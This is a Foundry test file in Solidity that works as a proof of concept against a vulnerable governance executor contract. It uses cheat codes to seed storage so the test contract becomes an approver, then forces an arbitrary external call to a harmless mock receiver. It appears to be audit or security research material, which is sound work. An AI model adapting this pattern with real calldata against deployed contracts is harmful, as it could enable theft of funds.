// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";                // Test already includes StdCheats
import { PoCReceiver } from "../src/mocks/PoCReceiver.sol";

// Interfaces for the vulnerable 0.4.x executor
interface IExecutor {
    function propose(address _target, bytes calldata _data) external returns (bytes32);
    function approve(bytes32 _proposalID) external;
    function execute(bytes32 _proposalID) external;
}

contract Executor_ArbitraryCall_PoC is Test {
    IExecutor private executor;
    address private execAddr;
    address private attacker;

    function setUp() public {
        attacker = address(this);

        // Deploy your vulnerable contract by artifact path
        execAddr = deployCode("Executor.sol:Executor");
        executor = IExecutor(execAddr);

        // ---- Seed minimal governance to enable propose/approve/execute locally ----
        // Storage layout in executor.sol:
        // slot 0: mapping(address => approver) approvers;
        // slot 1: uint8 approverCount;
        // slot 2: mapping(address => bool) votingContracts;
        // slot 3: mapping(bytes32 => proposal) proposals;

        // 1) approverCount = 1 at slot 1
        vm.store(execAddr, bytes32(uint256(1)), bytes32(uint256(1)));

        // 2) approvers[attacker] = { identity: nonzero, inPower: true }
        bytes32 slotIdxApprovers = bytes32(uint256(0)); // approvers mapping slot
        bytes32 key = bytes32(uint256(uint160(attacker)));
        bytes32 base = keccak256(abi.encode(key, slotIdxApprovers));
        // struct approver { bytes32 identity; bool inPower; }
        vm.store(execAddr, base, bytes32(uint256(1)));                       // identity != 0
        vm.store(execAddr, bytes32(uint256(base) + 1), bytes32(uint256(1))); // inPower = true
    }

    function test_ArbitraryExternalCall_via_execute() public {
        // Benign target we’ll force the Executor to call
        PoCReceiver receiver = new PoCReceiver();

        // Harmless calldata
        bytes memory data = abi.encodeWithSignature("markCalled()");

        // Propose -> Approve -> Execute
        bytes32 pid = executor.propose(address(receiver), data);
        executor.approve(pid);
        executor.execute(pid);

        // Assert the external call happened
        assertTrue(receiver.called(), "Expected PoCReceiver.markCalled() to be executed");
    }
}
